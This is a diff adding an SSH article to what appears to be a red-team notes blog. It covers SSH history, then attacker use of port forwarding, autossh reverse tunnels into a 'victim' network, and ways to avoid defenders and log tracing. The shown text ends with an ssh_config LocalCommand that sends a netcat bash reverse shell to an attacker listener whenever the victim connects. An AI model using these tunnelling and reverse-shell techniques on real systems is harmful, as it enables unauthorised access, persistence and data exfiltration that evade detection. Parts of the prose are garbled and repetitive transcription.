@@ -78,8 +78,8 @@
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="notes">
-    <meta property="article:published_time" content="2025-08-18T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-08-18T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-08-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-25T00:00:00+00:00">
     <meta property="article:tag" content="Protocol">
     <meta property="article:tag" content="Security">
     <meta property="article:tag" content="Networking">
@@ -109,15 +109,15 @@
       "name": "Broder"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-08-18T00:00:00\u002b00:00",
-    "datePublished": "2025-08-18T00:00:00\u002b00:00",
+    "dateCreated": "2025-08-25T00:00:00\u002b00:00",
+    "datePublished": "2025-08-25T00:00:00\u002b00:00",
     
-    "dateModified": "2025-08-18T00:00:00\u002b00:00",
+    "dateModified": "2025-08-25T00:00:00\u002b00:00",
     
     "keywords": ["Protocol","Security","Networking","Shell"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "0"
+    "wordCount": "2826"
   }]
   </script>
 
@@ -937,6 +937,8 @@
   
 
   
+    
+  
 
   
 
@@ -956,7 +958,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-08-18T00:00:00&#43;00:00">18 August 2025</time><span class="px-2 text-primary-500">&middot;</span>
+      <time datetime="2025-08-25T00:00:00&#43;00:00">25 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">14 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -1207,6 +1209,223 @@
 
     <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
       
+        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+          <div
+            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]
+            
+            ">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#wrap-arround">Wrap arround</a></li>
+    <li><a href="#history">History</a>
+      <ul>
+        <li><a href="#version-1">Version 1</a></li>
+        <li><a href="#version-2">Version 2</a></li>
+        <li><a href="#version-199">Version 1.99</a></li>
+        <li><a href="#ossh-and-openssh">OSSH and OpenSSH</a></li>
+        <li><a href="#future">Future</a></li>
+      </ul>
+    </li>
+    <li><a href="#analyse">Analyse</a></li>
+    <li><a href="#red-team-case">Red team case</a>
+      <ul>
+        <li><a href="#note">Note</a>
+          <ul>
+            <li><a href="#run-command">Run Command</a></li>
+            <li><a href="#file-transfer">File transfer</a></li>
+          </ul>
+        </li>
+        <li><a href="#fowarding">Fowarding</a>
+          <ul>
+            <li><a href="#local-fowarding">Local fowarding</a></li>
+            <li><a href="#dynamic-port-fowarding">Dynamic Port Fowarding</a></li>
+            <li><a href="#remote-port-fowarding">Remote Port Fowarding</a></li>
+            <li><a href="#proxy-command">Proxy Command</a></li>
+            <li><a href="#auto-ssh">Auto SSH</a></li>
+          </ul>
+        </li>
+        <li><a href="#configs">Configs</a>
+          <ul>
+            <li><a href="#ssh-config">SSH config</a></li>
+            <li><a href="#rc-file">RC file</a></li>
+          </ul>
+        </li>
+        <li><a href="#stealing-credentialss">Stealing Credentialss</a>
+          <ul>
+            <li><a href="#ssh-client-cont">SSH Client (CONT)</a></li>
+            <li><a href="#sshd-server">SSHD Server</a></li>
+            <li><a href="#paramiko-server">Paramiko Server</a></li>
+            <li><a href="#known-hosts">Known Hosts</a></li>
+          </ul>
+        </li>
+        <li><a href="#tunneling">Tunneling</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#wrap-arround">Wrap arround</a></li>
+    <li><a href="#history">History</a>
+      <ul>
+        <li><a href="#version-1">Version 1</a></li>
+        <li><a href="#version-2">Version 2</a></li>
+        <li><a href="#version-199">Version 1.99</a></li>
+        <li><a href="#ossh-and-openssh">OSSH and OpenSSH</a></li>
+        <li><a href="#future">Future</a></li>
+      </ul>
+    </li>
+    <li><a href="#analyse">Analyse</a></li>
+    <li><a href="#red-team-case">Red team case</a>
+      <ul>
+        <li><a href="#note">Note</a>
+          <ul>
+            <li><a href="#run-command">Run Command</a></li>
+            <li><a href="#file-transfer">File transfer</a></li>
+          </ul>
+        </li>
+        <li><a href="#fowarding">Fowarding</a>
+          <ul>
+            <li><a href="#local-fowarding">Local fowarding</a></li>
+            <li><a href="#dynamic-port-fowarding">Dynamic Port Fowarding</a></li>
+            <li><a href="#remote-port-fowarding">Remote Port Fowarding</a></li>
+            <li><a href="#proxy-command">Proxy Command</a></li>
+            <li><a href="#auto-ssh">Auto SSH</a></li>
+          </ul>
+        </li>
+        <li><a href="#configs">Configs</a>
+          <ul>
+            <li><a href="#ssh-config">SSH config</a></li>
+            <li><a href="#rc-file">RC file</a></li>
+          </ul>
+        </li>
+        <li><a href="#stealing-credentialss">Stealing Credentialss</a>
+          <ul>
+            <li><a href="#ssh-client-cont">SSH Client (CONT)</a></li>
+            <li><a href="#sshd-server">SSHD Server</a></li>
+            <li><a href="#paramiko-server">Paramiko Server</a></li>
+            <li><a href="#known-hosts">Known Hosts</a></li>
+          </ul>
+        </li>
+        <li><a href="#tunneling">Tunneling</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+            
+            
+          </div>
+        </div>
+      
 
 
       <div class="min-w-0 min-h-0 max-w-fit">
@@ -1216,6 +1435,496 @@
 
         <div class="article-content max-w-prose mb-20">
           
+<h2 class="relative group">Wrap arround 
+    <div id="wrap-arround" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#wrap-arround" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>SSH (Secure Shell)</strong> is a <code>network protocol</code> and suite of tools that creates an <strong>encrypted connection</strong> between two computers over an unsecured network, enabling secure remote access, command execution, and file transfers. It works by establishing a <code>secure &quot;tunnel&quot;</code> where data is authenticated and encrypted to protect it from interception, and it uses either <code>password or public-key</code> authentication to grant access to remote servers, primarily for administration and management purposes.</p>
+<p>Default port: 22</p>
+
+<h2 class="relative group">History 
+    <div id="history" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#history" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Version 1 
+    <div id="version-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#version-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>In 1995, <strong>SSH-1</strong> was designed by <strong>Tatu Ylönen</strong> (prompted by a password-sniffing attack at his university network), with the goals is replace the earlier <code>rlogin</code>, <code>telnet</code>, <code>ftp</code> and <code>rsh protocol</code> (<strong>not provide strong authentication nor guarantee confidentiality</strong>). The reason for port number 22 is between telnet (port 23) and ftp (port 21).</p>
+
+<h3 class="relative group">Version 2 
+    <div id="version-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#version-2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>In 2006, <strong>SSH-2</strong> was adopted as a standard (after being discussed in a working group named &ldquo;secsh&rdquo;). Although this offers improved security and new features, SSH-2 is not compatible with SSH-1. The specially I notice to is <strong>&ldquo;New features of SSH-2 include the ability to run any number of shell sessions over a single SSH connection.&rdquo;</strong></p>
+
+<h3 class="relative group">Version 1.99 
+    <div id="version-199" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#version-199" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>In January 2006, well after version 2.1 was established specified that an SSH server supporting 2.0 as well as prior versions should identify its protocol version as 1.99.</p>
+<p>SSH version 1.99 is not a distinct SSH protocol version in itself, but rather an indicator <strong>used by SSH servers</strong>. When an SSH server advertises itself as version 1.99, it signifies that the server <strong>supports both SSH version 1 (SSHv1) and SSH version 2 (SSHv2)</strong>. This allows for backward compatibility, meaning the server can negotiate a connection using either the older SSHv1 protocol or the more secure and modern SSHv2 protocol, depending on the client&rsquo;s capabilities and configuration.</p>
+<p>While SSHv1 offers backward compatibility, it is generally recommended to use SSHv2 due to known security vulnerabilities present
+in SSHv1. Many modern SSH clients and servers are configured to prioritize or exclusively use SSHv2 for enhanced security.</p>
+
+<h3 class="relative group">OSSH and OpenSSH 
+    <div id="ossh-and-openssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ossh-and-openssh" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>“software is like sex : it&rsquo;s better when it&rsquo;s free..” - <strong>Linus Torvalds</strong></p>
+<p>In 1999, developers, desiring availability of a free software version, restarted software development from the 1.2.12 release of the original SSH program, which was the last released under an open source license.</p>
+<ul>
+<li>This served as a code base for Björn Grönvall&rsquo;s OSSH software.</li>
+<li>Shortly thereafter, OpenBSD developers forked Grönvall&rsquo;s code and created OpenSSH, which shipped with Release 2.6 of OpenBSD. From this version, a &ldquo;portability&rdquo; branch was formed to port OpenSSH to other operating systems.</li>
+</ul>
+<p>As of 2005</p>
+<ul>
+<li>OpenSSH was the single most popular SSH implementation, being the default version in a large number of operating system distributions. OSSH meanwhile has become obsolete.</li>
+<li>OpenSSH continues to be maintained and supports the SSH-2 protocol, having expunged SSH-1 support from the codebase in the OpenSSH 7.6 release.</li>
+</ul>
+
+<h3 class="relative group">Future 
+    <div id="future" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#future" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>In 2023, an alternative to traditional SSH was proposed under the name SSH3 by PhD student François Michel and Professor Olivier Bonaventure and its code has been made open source. This new version implements the original SSH Connection Protocol but operates on top of HTTP/3, which runs on QUIC.</p>
+<p>However, the name SSH3 is under discussion, and the project aims to rename itself to a more suitable name. The discussion stems from the fact that this new implementation significantly revises the SSH protocol, suggesting it should not be called SSH3.</p>
+
+<h2 class="relative group">Analyse 
+    <div id="analyse" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#analyse" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>SSH is a network protocol that provides secure communication over unsafe environments. It ensures confidentiality and integrity, preventing attackers or unauthorized users from reading or tampering with your connection.</p>
+<p>SSH allows you to connect from external environments to internal machines, as well as securely communicate between systems within the internal network.</p>
+<p>If an attacker compromises one machine, they can leverage SSH to pivot into other systems that the victim connects to, and even set up tunnels for faster exploitation.</p>
+<p>Because SSH traffic is encrypted, IPS, IDS, and AV solutions often trust it by default and cannot inspect the activity inside the tunnel. Attackers can abuse this to ‘live off the land’ or carry out sophisticated exploitation undetected.</p>
+
+<h2 class="relative group">Red team case 
+    <div id="red-team-case" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#red-team-case" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Note 
+    <div id="note" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#note" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">Run Command 
+    <div id="run-command" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#run-command" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>We can run command when connect to a remote system</p>
+<p><code>ssh victim@10.10.10.10</code></p>
+<p>or run a single command</p>
+<p><code>ssh victim@10.10.10.10 whoami</code></p>
+<p>This is very useful if the system is being actively defended, so blue team or someone is actually on the system watching for connections and seeing who&rsquo;s logged in this. They&rsquo;d have to catch that and run that command while the <code>whoami</code> command is running or whatever command you want to run.</p>
+
+<h4 class="relative group">File transfer 
+    <div id="file-transfer" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#file-transfer" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>SSH also makes file transfers convenient through tools like <code>scp</code> and <code>sftp</code>.</p>
+<p>If you want, you can run command singularly so you don&rsquo;t even have an interactive session so it&rsquo;s a lot harder to find.</p>
+
+<h3 class="relative group">Fowarding 
+    <div id="fowarding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#fowarding" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">Local fowarding 
+    <div id="local-fowarding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#local-fowarding" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/LocalForwarding.png"/>
+</p>
+<p><code>ssh -L 8080:192.168.1.10:80 victim@10.10.10.10 -N &amp;</code></p>
+<p>I&rsquo;ll have port 8080 on my local system will jump through that 10.10.10 system and then point at one of the systems on the other side.</p>
+<p>All of that will go over the SSH tunnel. So that traffic is encrypted from my laptop here to this system. And then it comes out of here and will wind up over on looking at this system.</p>
+<p>Listening on my host on port 8080 on my laptop. I want that traffic when I go to port 8080 to go out the other side to 192.168.1.10 on port 80. So say there&rsquo;s a web server on that system that I&rsquo;m trying to get access to. And then I&rsquo;m logging in as Bob to that that bounce node 10.10.10.10. <code>I should have done different IP addresses</code>. And then interestingly here, I&rsquo;m going to give it <code>-N</code>. So that tells it <code>not to request a shell</code>. And then I&rsquo;m going to background it. <strong>I didn&rsquo;t request a shell on the remote system</strong>.</p>
+<p><strong>So once again, if there&rsquo;s a defender watching that system trying to see like run a who, or see who&rsquo;s logged into it, all they&rsquo;ll actually see is that there&rsquo;s an SSHD process, it doesn&rsquo;t actually spawn a shell or anything. And then if they&rsquo;re really on the ball, they&rsquo;ll look at netstat and see the network connection. But most of the time, they just won&rsquo;t realize that there&rsquo;s somebody logged in. And then, like I said, that&rsquo;s backgrounded.</strong></p>
+
+<h4 class="relative group">Dynamic Port Fowarding 
+    <div id="dynamic-port-fowarding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#dynamic-port-fowarding" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/DynamicFowarding.png"/>
+</p>
+<p>But I don&rsquo;t want to do that one by one by one through all these systems on this network. Thankfully, SSH was nice enough to think of the this the kind developers of open SSH. They implemented this thing called dynamic ports forwarding. So what this does is this lets me open up on my system, a port that will forward over that SSH channel, either SOX4 or SOX5 proxy. And then I&rsquo;m essentially using that SSH server as a proxy server. And I can get to any of the systems behind that network as long as whatever I&rsquo;m using speaks that SSH protocol. So if I point my, if I use this proxy port, then I can get proxy that through this system and just get to any of the systems that are behind here in the way this kind of basic network example is laid out. Can use browser or proxychains to configure dynamic port forwarding.s</p>
+
+<h4 class="relative group">Remote Port Fowarding 
+    <div id="remote-port-fowarding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#remote-port-fowarding" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/RemoteFowarding.png"/>
+</p>
+<p>I am sitting on my laptop and I would like a port on that SSH server to open up and forward that port back to my system. So I&rsquo;ll do this with SSH a lot to get from a system out to the network and then be able to do all of that same forwarding and tunneling and stuff just in the opposite way.and I would like a port on that SSH server to open up and forward that port back to my system. So I&rsquo;ll do this with SSH a lot to get from a system out to the network and then be able to do all of that same forwarding and tunneling and stuff just in the opposite way.</p>
+<p>I&rsquo;m actually on, I&rsquo;d have to be, I have to be on both systems in this scenario. So I&rsquo;m on my laptop and then I also have access to this system in the network and I&rsquo;m trying to exfil some data or something. I can&rsquo;t get out because they&rsquo;re blocking the internet, but I have access to this. I have access to my laptop. So what I do is I SSH and I set up a remote forward from here that says, Hey, listen 2222 here and forward that back to me on port 22, which is SSH.</p>
+<p>Then from this system, I can just use any of those SSH commands provided I have the SSH command line and I can do stuff like copy files to here, but it&rsquo;s really forwarding to here. So anyone looking at the network traffic, nothing&rsquo;s actually going out over the firewall or anything. It&rsquo;s just traffic going to here. And then there&rsquo;s a secure connection to here from, from the bounce host to my laptop.</p>
+
+<h4 class="relative group">Proxy Command 
+    <div id="proxy-command" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#proxy-command" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/ProxyCommand.png"/>
+</p>
+<p><code>-o ProxyCommand=&quot;ssh -W %h:%p &lt;user&gt;@&lt;IP&gt;&quot;</code></p>
+<p>I have a tunnel and I want to log into that. I want to log in through my, my jump box or my bounce node. I want to land over here. So I would have to SSH to here, do a port forward to tell it to go over here and then SSH that port forward and go over here.</p>
+<p>SSH has this cool option called a proxy command. The proxy command is the old way to do this. And they&rsquo;ve actually since implemented a new version, but proxy command is still super useful and we&rsquo;ll see another use of this in just a second.</p>
+<p><code>local:~$ ssh -o ProxyCommand =&quot;ssh -W %h:%p bob@10.10.10.10&quot; bob@remote</code></p>
+<p>Instead of connecting directly, run this command to create the connection. This connect to <code>bob@10.10.10.10</code> (the jump host), and then forward stdin/stdout to the final target.</p>
+<p><code>local:~$ ssh -J bob@10.10.10.10 bob@remote</code></p>
+<p>It’s a shorthand for the <code>ProxyCommand</code> trick above.</p>
+<p>Conclusion</p>
+<ul>
+<li>
+<p><code>ProxyCommand</code>: old-school, very flexible (you can use <code>nc</code>, <code>socat</code>, or custom commands, not just <code>SSH</code>).</p>
+</li>
+<li>
+<p><code>J</code> <strong>(JumpHost)</strong>: simpler, cleaner syntax, but less flexible.</p>
+</li>
+</ul>
+<p>→ <code>Local (your PC) → Jump Host (10.10.10.10) → Remote Server (remote)</code></p>
+<pre tabindex="0"><code class="language-config" data-lang="config"># Define the jump host
+Host jump
+    HostName 10.10.10.10
+    User bob
+
+# Define the remote, going through jump
+Host remote
+    HostName remote        # could also be an IP like 192.168.1.100
+    User bob
+    ProxyJump jump
+</code></pre><p><strong>Another exampler</strong>:</p>
+<p><code>ssh -o ProxyCommand=&quot;ncat --proxy proxyhost 1080 %h %p&quot; bob@remote</code></p>
+<p>→ <code>local ssh → ncat → proxyhost:1080 (SOCKS proxy) → remote:22</code></p>
+<pre tabindex="0"><code class="language-config" data-lang="config">Host remote
+    HostName remote
+    User bob
+    ProxyCommand ncat --proxy proxyhost:1080 %h %p
+</code></pre>
+<h4 class="relative group">Auto SSH 
+    <div id="auto-ssh" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#auto-ssh" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/AutoSSH.png"/>
+</p>
+<p>Another thing that is very useful here is so now I have all of these tunnels and this forwarding and all of this cool stuff that I want to set up. But SSH is a TCP protocol. So if anything happens in this connection, any of the routers or something, timeout, something weird happens, that connection will die. Maybe I want this tunnel to be set up really long lived.</p>
+<p>And how I accomplish this is with a command called auto SSH. And what I like to do with this is I will set up auto SSH to log into my laptop and forward port 2222 on my laptop back to the host. It would actually forward from 2222 back to my host on 22 and tunnel that traffic. So I connect here and it goes out here. So there&rsquo;s an auto SSH connection out. It sets up that remote port forward to come back.</p>
+<pre tabindex="0"><code>autossh -M 0 -o &#34;ServerAliveInterval 30&#34; -o &#34;ServerAliveCountMax 3&#34; \
+-R 127.0.0.1:2222:127.0.0.1:22 hackbox
+</code></pre><p>I&rsquo;m giving it some options here, the server alive interval, server alive max count. So it&rsquo;ll wait 30 seconds and it&rsquo;ll max try three times. And then I&rsquo;m telling it to remote forward on 2222 to port 22 on my local host. And then I log into my laptop, aka hack box. And then on hack box, I can SSH -P to 2222 and tell it Bob because that&rsquo;s the user that I have at local host. And that&rsquo;s actually going to go through that tunnel back in through the network. And then I&rsquo;m just logged into that victim system.</p>
+<p><strong>Once again, this is super cool because like all someone monitoring this network would see as someone logging into a system remotely. So say you&rsquo;re here, this boundary is monitored. All you see is an SSH out. You don&rsquo;t actually see me tunneling back in. So it looks like someone who already has logged into this just logged into something on the internet.</strong></p>
+<pre tabindex="0"><code>ssh -p 2222 bob@localhost
+</code></pre><p><strong>Graph</strong></p>
+<pre tabindex="0"><code>Victim (behind NAT) --[Reverse SSH]--&gt; Hackbox (public server)
+                                   (opens port 2222 mapped to Victim:22)
+</code></pre><p>Now, on Hackbox:</p>
+<pre tabindex="0"><code>ssh -p 2222 bob@localhost
+        ↓
+Tunnel sends it back to Victim:22
+        ↓
+You get shell on Victim
+</code></pre><p>So a bunch of fun stuff you can do with port forwarding super useful for kind of crossing those security boundaries and getting into networks that you&rsquo;re not necessarily supposed to have access to with auto SSH, you can maintain that access. And if you get creative with it, you can jump around and get to a bunch of different network segments and really make it confusing. With all the port forwarding, you can make it look like someone&rsquo;s connecting from a different system as long as you have access to connect all through. So someone that&rsquo;s trying to trace that back through network logs or system logs is going to have a rough time because you&rsquo;re essentially using a proxy to get through a bunch of stuff. And you can proxy proxy proxy and jump around and good clean fun to be had by all.</p>
+
+<h3 class="relative group">Configs 
+    <div id="configs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#configs" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+<h4 class="relative group">SSH config 
+    <div id="ssh-config" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ssh-config" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p align="center">
+    <img src="img/SSHConfig.png"/>
+</p>
+<p>SSH config is get it to do stuff that people are not intending. So let&rsquo;s say in this scenario, I know that Bob is SSHing from the server that he&rsquo;s on, 10.10.10.10 to that system that he has internally. Every time he does that, I would like to get a shell back to me on 4141 from his system. With SSH config, I can do that. So here I configure it, say I&rsquo;m on his server for some reason. I have access to his SSH config. I&rsquo;m going to go ahead and I like to set this up for all hosts. By default, you&rsquo;re not permitted to run a local command, but luckily in the configs file, you can just tell it to let you do that. And what I&rsquo;m going to do here is tell it the local command is to netcat me a bin bash shell to my IP address on my listener and background, and then do whatever else Bob was trying to do. So every time Bob logs into a host, it will spin a shell back to me and I&rsquo;ll get access to his system. So say my shells keep dying or I just want to kind of maintain access in a super easy, lightweight way. Another config file that is super awesome is this run commands file or RC file.</p>
+<ul>
+<li><strong>Global:</strong> <code>/etc/ssh/ssh_config</code></li>
+<li><strong>User:</strong> <code>~/.ssh/config</code></li>
+</ul>
+<p>Let SSH know what to do</p>
+<ul>
+<li>Avoid some typing</li>
+<li>Interesting things</li>
+</ul>
+<pre tabindex="0"><code class="language-config" data-lang="config">Hostname *
+    PermitLocalCommand True
+    LocalCommand ncat -e /bin/bash &lt;LISTENER IP&gt; 4141 &amp;
